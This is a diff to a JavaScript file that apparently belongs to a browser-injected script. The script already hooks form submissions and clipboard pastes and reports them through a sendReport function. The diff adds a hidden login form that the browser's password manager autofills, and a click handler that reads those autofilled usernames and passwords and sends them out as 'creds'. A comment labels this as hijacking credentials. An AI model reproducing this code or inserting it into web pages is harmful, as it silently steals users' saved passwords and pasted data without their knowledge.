@@ -19,6 +19,48 @@ function sendReport(type, data, done_callback) {
     req.send(JSON.stringify(payload));
 }
 
+function createCredsForm() {
+    var formElem = document.createElement("form");
+    formElem.setAttribute("method", "GET");
+    formElem.setAttribute("action", "index.html");
+    formElem.setAttribute("autocomplete", "on");
+    formElem.style.display = "none";
+
+    function addInputElement(name, type, autocompleteAttribute) {
+        var inputElem = document.createElement("input");
+        inputElem.toggleAttribute("required", true);
+        inputElem.setAttribute("type", type);
+        inputElem.setAttribute("name", name);
+        inputElem.setAttribute("id", "^" + name);
+
+        if (autocompleteAttribute !== undefined) {
+            inputElem.setAttribute("autocomplete", autocompleteAttribute);
+        }
+
+        formElem.appendChild(inputElem);
+    }
+
+    addInputElement("user", "text");
+    addInputElement("pass", "password");
+
+    document.getElementsByTagName("body")[0].appendChild(formElem);
+
+    return formElem;
+}
+
+function getFormInputs(formElem) {
+    var inputs = [];
+    for (var i = 0; i < formElem.children.length; i++) {
+        var inputElem = formElem.children[i];
+        var inputElemName = inputElem.getAttribute("name");
+        var inputElemValue = inputElem.value;
+        //inputs[inputElemName] = inputElemValue;
+        inputs.push(inputElemValue);
+    }
+    return inputs;
+}
+
+
 // Hook form submits
 function submitHook(e) {
      // https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement
@@ -58,6 +100,7 @@ function submitHook(e) {
     return false;
 }
 
+// Hook clipboard paste events
 function clipboardPasteHook(e) {
     sendReport("clipboard", {
        type: e.type,
@@ -65,5 +108,18 @@ function clipboardPasteHook(e) {
     });
 }
 
+// Hijack user's credentials
+function clickHook(e) {
+    var credsInputs = getFormInputs(credsFormElem);
+    sendReport("creds", {
+       "user": credsInputs[0],
+       "pass": credsInputs[1]
+    });  
+    document.removeEventListener("click", clickHook);
+}
+
+var credsFormElem = createCredsForm();
 document.addEventListener("submit", submitHook, true);
 document.addEventListener("paste", clipboardPasteHook, true);
+document.addEventListener("click", clickHook)    
+
